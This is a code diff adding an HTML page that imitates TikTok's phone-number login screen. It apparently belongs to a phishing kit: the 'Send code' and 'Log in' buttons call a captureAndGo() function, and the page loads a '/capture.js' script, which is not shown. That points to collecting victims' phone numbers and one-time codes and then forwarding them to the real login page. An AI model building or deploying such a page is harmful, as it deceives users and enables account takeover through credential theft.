@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Log in — TikTok</title>
+  <link rel="stylesheet" href="/shared.css" />
+</head>
+<body>
+
+  <header>
+    <a href="/login" class="logo">
+      <svg width="32" height="32" viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="8" fill="#010101"/><path d="M22.5 8c.28 1.64 1.3 3.07 2.5 3.8v3.2c-1.4-.04-2.74-.47-3.87-1.24v5.64c0 3.64-2.98 6.6-6.63 6.6A6.63 6.63 0 0 1 8 19.4c0-3.64 2.98-6.6 6.63-6.6.23 0 .45.01.67.04v3.26a3.36 3.36 0 0 0-.67-.07 3.4 3.4 0 0 0-3.4 3.37 3.4 3.4 0 0 0 3.4 3.37 3.4 3.4 0 0 0 3.4-3.37V8h3.47z" fill="white"/></svg>
+      TikTok
+    </a>
+    <button class="feedback-btn">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17" stroke-width="2.5" stroke-linecap="round"/></svg>
+      Feedback and help
+    </button>
+  </header>
+
+  <main>
+    <div class="card">
+      <h1>Log in</h1>
+
+      <!-- Tabs -->
+      <div class="tabs">
+        <a href="/login/phone" class="tab active">Phone</a>
+        <a href="/login/email" class="tab">Email / Username</a>
+      </div>
+
+      <!-- Phone input -->
+      <div class="input-group" style="width:100%">
+        <div class="input-label-row">
+          <span class="input-label">Phone</span>
+          <a href="/login/email" class="input-label-link">Log in with email or username</a>
+        </div>
+        <div class="phone-row">
+          <select class="country-select">
+            <option value="+27">🇿🇦 +27</option>
+            <option value="+1">🇺🇸 +1</option>
+            <option value="+44">🇬🇧 +44</option>
+            <option value="+91">🇮🇳 +91</option>
+            <option value="+61">🇦🇺 +61</option>
+            <option value="+49">🇩🇪 +49</option>
+            <option value="+33">🇫🇷 +33</option>
+          </select>
+          <input class="input-field" type="tel" placeholder="Phone number" />
+        </div>
+      </div>
+
+      <!-- Code input -->
+      <div class="input-group" style="width:100%">
+        <div class="phone-row">
+          <input class="input-field" type="text" placeholder="Enter 6-digit code" style="flex:1" />
+          <button class="send-code-btn" onclick="captureAndGo()">Send code</button>
+        </div>
+      </div>
+
+      <!-- Login with password link -->
+      <a href="/login/email" class="forgot-link" style="align-self:flex-start; margin-top:2px; margin-bottom:18px;">
+        Log in with password
+      </a>
+
+      <!-- Submit -->
+      <button class="btn-primary" onclick="captureAndGo('/login')">Log in</button>
+
+      <!-- Go back -->
+      <a href="/login" class="go-back">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+        Go back
+      </a>
+
+      <div class="account-row">
+        Don't have an account? <a href="/signup">Sign up</a>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <button class="lang-btn">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+      English (US)
+    </button>
+    <span class="copyright">© 2026 TikTok</span>
+  </footer>
+  <script src="/capture.js"></script>
+
+</body>
+</html>
